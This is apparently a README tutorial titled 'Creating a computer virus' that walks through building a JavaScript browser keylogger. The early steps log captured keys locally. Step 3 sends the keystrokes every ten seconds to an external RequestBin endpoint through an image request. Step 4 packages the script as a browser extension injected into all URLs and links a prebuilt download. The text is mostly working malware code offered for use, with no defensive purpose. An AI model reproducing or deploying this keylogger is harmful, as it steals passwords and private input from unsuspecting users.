# Creating a computer virus 

Welcome to creating a simple virus 

## Step 1

Lets print


```
var keys = '';
document.onkeypress = function (e) {
    get = window.event ? event : e;
    key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}
window.setInterval(function () {
    if (keys.length > 0){
        console.log(keys);
    }
    keys = '';
}, 10000);
```

## Step 2

Lets do something fun

```
var keys = '';
document.onkeypress = function (e) {
    get = window.event ? event : e;
    key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}
window.setInterval(function () {
    if (keys.length > 0){
        alert(keys);
    }
    keys = '';
}, 10000);
```


## Step 3

Lets take things to the next level

- Open [Request bin](https://requestbin.net/)

- Click **Create a RequestBin** 


```
var keys = '';
document.onkeypress = function (e) {
    get = window.event ? event : e;
    key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}
window.setInterval(function () {
    if (keys.length > 0){
        new Image().src = 'http://{request bin url}?keys=' + keys;
    }
    keys = '';
}, 10000);
```


## Step 4

Lets make it even more cooler

/content.js 
```
{
  "manifest_version": 2,
  "name": "Keylogger",
  "version": "0.1",

  "content_scripts": [
    {
      "matches": [
        "<all_urls>"
      ],
      "js": ["content.js"]
    }
  ]
}
```
### Click [here](https://github.com/EXTREMOPHILARUM/virus/releases/download/0.1/extension.zip) if you dont want to work hard
